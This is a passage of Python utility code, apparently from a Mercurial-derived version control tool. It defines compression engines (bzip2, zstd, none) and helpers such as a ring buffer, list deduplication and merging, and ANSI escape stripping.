        return "bzip2", "BZ"

    # We declare a protocol name but don't advertise by default because
    # it is slow.
    def wireprotosupport(self):
        return compewireprotosupport("bzip2", 0, 0)

    def compressstream(self, it, opts=None):
        opts = opts or {}
        z = bz2.BZ2Compressor(opts.get("level", 9))
        for chunk in it:
            data = z.compress(chunk)
            if data:
                yield data

        yield z.flush()

    def decompressorreader(self, fh):
        def gen():
            d = bz2.BZ2Decompressor()
            for chunk in filechunkiter(fh):
                yield d.decompress(chunk)

        return chunkbuffer(gen())


compengines.register(_bz2engine())


class _truncatedbz2engine(compressionengine):
    def name(self):
        return "bz2truncated"

    def bundletype(self):
        return None, "_truncatedBZ"

    # We don't implement compressstream because it is hackily handled elsewhere.

    def decompressorreader(self, fh):
        def gen():
            # The input stream doesn't have the 'BZ' header. So add it back.
            d = bz2.BZ2Decompressor()
            d.decompress("BZ")
            for chunk in filechunkiter(fh):
                yield d.decompress(chunk)

        return chunkbuffer(gen())


compengines.register(_truncatedbz2engine())


class _noopengine(compressionengine):
    def name(self):
        return "none"

    def bundletype(self):
        """No compression is performed.

        Use this compression engine to explicitly disable compression.
        """
        return "none", "UN"

    # Clients always support uncompressed payloads. Servers don't because
    # unless you are on a fast network, uncompressed payloads can easily
    # saturate your network pipe.
    def wireprotosupport(self):
        return compewireprotosupport("none", 0, 10)

    # We don't implement revlogheader because it is handled specially
    # in the revlog class.

    def compressstream(self, it, opts=None):
        return it

    def decompressorreader(self, fh):
        return fh

    class nooprevlogcompressor(object):
        def compress(self, data):
            return None

    def revlogcompressor(self, opts=None):
        return self.nooprevlogcompressor()


compengines.register(_noopengine())


class _zstdengine(compressionengine):
    def name(self):
        return "zstd"

    @propertycache
    def _module(self):
        # Not all installs have the zstd module available. So defer importing
        # until first access.
        try:
            from .rust.bindings import zstd

            # Force delayed import.
            zstd.decode_all
            return zstd
        except ImportError:
            return None

    def available(self):
        return bool(self._module)

    def bundletype(self):
        """A modern compression algorithm that is fast and highly flexible.

        Only supported by Mercurial 4.1 and newer clients.

        With the default settings, zstd compression is both faster and yields
        better compression than ``gzip``. It also frequently yields better
        compression than ``bzip2`` while operating at much higher speeds.

        If this engine is available and backwards compatibility is not a
        concern, it is likely the best available engine.
        """
        return "zstd", "ZS"

    def wireprotosupport(self):
        return compewireprotosupport("zstd", 50, 50)

    def revlogheader(self):
        return "\x28"

    def compressstream(self, it, opts=None):
        opts = opts or {}
        # zstd level 3 is almost always significantly faster than zlib
        # while providing no worse compression. It strikes a good balance
        # between speed and compression.
        level = opts.get("level", 3)

        zstd = self._module
        buf = stringio()
        for chunk in it:
            buf.write(chunk)

        yield zstd.encode_all(buf.getvalue(), level)

    def decompressorreader(self, fh):
        zstd = self._module

        def itervalues():
            buf = fh.read()
            yield zstd.decode_all(buf)

        return chunkbuffer(itervalues())

    class zstdrevlogcompressor(object):
        def __init__(self, zstd, level=3):
            self._zstd = zstd
            self._level = level

        def compress(self, data):
            return self._zstd.encode_all(data, self._level)

        def decompress(self, data):
            return self._zstd.decode_all(data)

    def revlogcompressor(self, opts=None):
        opts = opts or {}
        return self.zstdrevlogcompressor(self._module)


compengines.register(_zstdengine())


def bundlecompressiontopics():
    """Obtains a list of available bundle compressions for use in help."""
    # help.makeitemsdocs() expects a dict of names to items with a .__doc__.
    items = {}

    # We need to format the docstring. So use a dummy object/type to hold it
    # rather than mutating the original.
    class docobject(object):
        pass

    for name in compengines:
        engine = compengines[name]

        if not engine.available():
            continue

        bt = engine.bundletype()
        if not bt or not bt[0]:
            continue

        doc = pycompat.sysstr("``%s``\n    %s") % (bt[0], engine.bundletype.__doc__)

        value = docobject()
        value.__doc__ = doc
        value._origdoc = engine.bundletype.__doc__
        value._origfunc = engine.bundletype

        items[bt[0]] = value

    return items


i18nfunctions = bundlecompressiontopics().values()

# convenient shortcut
dst = debugstacktrace


def safename(f, tag, ctx, others=None):
    """
    Generate a name that it is safe to rename f to in the given context.

    f:      filename to rename
    tag:    a string tag that will be included in the new name
    ctx:    a context, in which the new name must not exist
    others: a set of other filenames that the new name must not be in

    Returns a file name of the form oldname~tag[~number] which does not exist
    in the provided context and is not in the set of other names.
    """
    if others is None:
        others = set()

    fn = "%s~%s" % (f, tag)
    if fn not in ctx and fn not in others:
        return fn
    for n in itertools.count(1):
        fn = "%s~%s~%s" % (f, tag, n)
        if fn not in ctx and fn not in others:
            return fn


class ring(object):
    """
    FIFO Ringbuffer

    >>> r = ring(5)
    >>> r.items()
    []
    >>> r.push(1)
    >>> r.push(2)
    >>> r.push(3)
    >>> r.push(4)
    >>> len(r)
    4
    >>> r.items()
    [1, 2, 3, 4]
    >>> r.pop()
    1
    >>> r.items()
    [2, 3, 4]
    >>> r.push(5)
    >>> r.push(6)
    >>> r.push(7)
    >>> r.items()
    [3, 4, 5, 6, 7]
    >>> len(r)
    5
    >>> r[0]
    3
    >>> r[-1]
    7
    >>> r.pop()
    3
    >>> r.pop()
    4
    >>> r.pop()
    5
    >>> r.pop()
    6
    >>> r.items()
    [7]
    >>> r.pop()
    7
    >>> r.pop()
    Traceback (most recent call last):
        ...
    IndexError
    """

    def __init__(self, maxsize):
        self._maxsize = maxsize
        self._data = [None] * maxsize
        self._offset = 0
        self._len = 0

    def __len__(self):
        return self._len

    def __getitem__(self, index):
        if index < -self._len or index >= self._len:
            raise IndexError
        if index < 0:
            return self._data[(self._offset + self._len + index) % self._maxsize]
        else:
            return self._data[(self._offset + index) % self._maxsize]

    def push(self, item):
        self._data[(self._offset + self._len) % self._maxsize] = item
        if self._len >= self._maxsize:
            # new item has pushed the oldest one out
            self._offset += 1
        else:
            self._len += 1

    def pop(self):
        if self._len <= 0:
            raise IndexError
        item = self._data[self._offset]
        self._offset = (self._offset + 1) % self._maxsize
        self._len -= 1
        return item

    def items(self):
        end = self._offset + self._len
        if end <= self._maxsize:
            return self._data[self._offset : end]
        else:
            head = self._data[self._offset : self._maxsize]
            tail = self._data[: (end % self._maxsize)]
            return head + tail


def timefunction(key, uiposition, uiname):
    """A decorator for indicating a function should be timed and logged.

    `uiposition` the integer argument number that contains the ui or a reference
    to the ui.

    `uiname` the attribute name on the ui argument that contains the ui. Set to
    None to indicate the argument is the ui.

    Example: For a function with signature 'def foo(repo, something):` the
    decorator would be `timefunction("blah", 0, 'ui')` to access repo.ui. For a
    function with signature `def foo(something, ui):` the decorator would be
    `timefunction("blah", 1, uiname=None)` to access ui.
    """

    def wrapper(func):
        def inner(*args, **kwargs):
            uiarg = args[uiposition]
            if uiname is not None:
                uiarg = getattr(uiarg, uiname)
            with uiarg.timesection(key):
                return func(*args, **kwargs)

        return inner

    return wrapper


def expanduserpath(path):
    if not path:
        return path
    username = getuser()
    return path.replace("%i", username).replace("${USER}", username)


ansiregex = remod.compile(
    (
        r"\x1b("
        r"(\[\??\d+[hl])|"
        r"([=<>a-kzNM78])|"
        r"([\(\)][a-b0-2])|"
        r"(\[\d{0,2}[ma-dgkjqi])|"
        r"(\[\d+;\d+[hfy]?)|"
        r"(\[;?[hf])|"
        r"(#[3-68])|"
        r"([01356]n)|"
        r"(O[mlnp-z]?)|"
        r"(/Z)|"
        r"(\d+)|"
        r"(\[\?\d;\d0c)|"
        r"(\d;\dR))"
    ),
    flags=remod.IGNORECASE,
)


def stripansiescapes(s):
    """Removes ANSI escape sequences from a string.
    Borrowed from https://stackoverflow.com/a/45448194/149111
    """
    return ansiregex.sub("", s)


def removeduplicates(items, key=None):
    """Returns a list containing everything in items, with duplicates removed.

    If ``key`` is not None, it is used as a function to map from the item in the
    list to a value that determines uniqueness.  This value must be hashable.

    The order of items is preserved.  Where duplicates are encountered, the
    first item in the list is preserved.
    """
    if len(items) < 2:
        return items
    if key is None:
        key = lambda item: item
    uniqueitems = []
    seen = set()
    for item in items:
        itemkey = key(item)
        if itemkey not in seen:
            seen.add(itemkey)
            uniqueitems.append(item)
    return uniqueitems


def removesortedduplicates(items):
    """Returns the sorted list items, with duplicates removed.

    This is faster than removeduplicates, but only works on sorted lists."""
    if len(items) < 2:
        return items
    uniqueitems = []
    prev = object()
    for item in items:
        if item != prev:
            uniqueitems.append(item)
            prev = item
    return uniqueitems


def mergelists(a, b):
    """Merge two sorted lists, removing duplicates

    >>> mergelists([1, 2, 3], [1, 4, 5])
    [1, 2, 3, 4, 5]
    >>> mergelists([1, 2, 2, 3, 3], [2, 2, 4, 5, 5])
    [1, 2, 3, 4, 5]
    >>> mergelists([1, 2, 3], [97, 98, 99])
    [1, 2, 3, 97, 98, 99]
    >>> mergelists([97, 98, 99], [1, 2, 3])
    [1, 2, 3, 97, 98, 99]
    >>> mergelists([1, 2, 3], [])
    [1, 2, 3]
    >>> mergelists([], [1, 2, 3])
    [1, 2, 3]
    >>> mergelists([], [])
    []
    >>> mergelists([[1, 2], [3, 4]], [[2, 3], [4, 5]])
    [[1, 2], [2, 3], [3, 4], [4, 5]]
    """
    i = j = 0
    na = len(a)
    nb = len(b)
    result = []
    while i < na or j < nb:
        if i < na and j < nb:
            item = min(a[i], b[j])
        elif i < na:
            item = a[i]
        else:
            item = b[j]
        result.append(item)
        while i < na and a[i] == item:
            i += 1
        while j < nb and b[j] == item:
            j += 1
    return result


def makerandomidentifier(length=16):
    """Generate a random identifier"""
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _x in range(length))


def log(service, *msg, **opts):
    """hook for logging facility extensions

    This allows extension logging when a ui object is not available.
    Prefer to use 'ui.log' if a ui object is available as more extensions
    are able to hook that location.

    service should be a readily-identifiable subsystem, which will
    allow filtering.

    *msg should be a newline-terminated format string to log, and
    then any values to %-format into that format string.

    **opts is a dict of additional key-value pairs to log.
    """
